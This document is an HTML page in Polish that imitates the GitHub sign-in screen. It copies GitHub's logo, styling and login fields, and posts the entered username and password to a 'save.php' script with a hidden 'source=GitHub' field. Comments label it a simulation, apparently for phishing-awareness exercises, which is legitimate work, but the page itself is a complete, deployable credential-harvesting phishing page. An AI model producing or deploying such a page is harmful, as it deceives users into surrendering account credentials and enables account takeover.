<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>GitHub</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
      background-color: #ffffff;
      margin: 0;
      padding: 0;
      text-align: center;
      color: #24292f;
    }

    .container {
      max-width: 360px;
      margin: 60px auto;
    }

    .logo {
      margin-bottom: 20px;
    }

    .logo img {
      width: 48px;
      height: 48px;
    }

    h1 {
      font-size: 20px;
      margin-bottom: 20px;
      font-weight: 400;
    }

    .box {
      border: 1px solid #d0d7de;
      border-radius: 6px;
      padding: 20px;
      background-color: #f6f8fa;
      margin-bottom: 16px;
      text-align: left;
    }

    label {
      font-size: 14px;
      font-weight: 600;
      display: block;
      margin-bottom: 5px;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 6px 8px;
      font-size: 14px;
      border: 1px solid #d0d7de;
      border-radius: 6px;
      margin-bottom: 16px;
      outline: none;
    }

    input[type="text"]:focus,
    input[type="password"]:focus {
      border-color: #0969da;
      box-shadow: 0 0 0 3px rgba(9, 105, 218, 0.3);
    }

    .forgot {
      text-align: right;
      margin-top: -12px;
      margin-bottom: 16px;
    }

    .forgot a {
      font-size: 12px;
      color: #0969da;
      text-decoration: none;
    }

    .btn-signin {
      width: 100%;
      background-color: #2da44e;
      color: white;
      padding: 8px;
      font-size: 14px;
      font-weight: 600;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }

    .btn-signin:hover {
      background-color: #218739;
    }

    .footer {
      margin-top: 60px;
      font-size: 12px;
      color: #57606a;
    }

    .footer a {
      color: #0969da;
      margin: 0 6px;
      text-decoration: none;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="logo">
      <!-- Symulowany logotyp GitHub -->
      <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" alt="Logo">
    </div>
    <h1>Zaloguj sie</h1>

    <div class="box">
      <!-- Formularz symulacyjny -->
      <form action="save.php" method="POST">
        <!-- Ukryte pole ze źródłem -->
        <input type="hidden" name="source" value="GitHub">

        <label for="username">Nazwa użytkownika lub email</label>
        <input type="text" id="username" name="username" placeholder="np. jan.kowalski" required>

        <label for="password">Hasło</label>
        <input type="password" id="password" name="password" placeholder="Wprowadź hasło" required>

        <div class="forgot">
          <a href="#">Nie pamiętasz hasła?</a>
        </div>

        <button type="submit" class="btn-signin">Zaloguj się</button>
      </form>
    </div>

    <div class="footer">
      <a href="#">Regulamin</a>
      <a href="#">Prywatność</a>
      <a href="#">Kontakt</a>
    </div>
  </div>

</body>
</html>
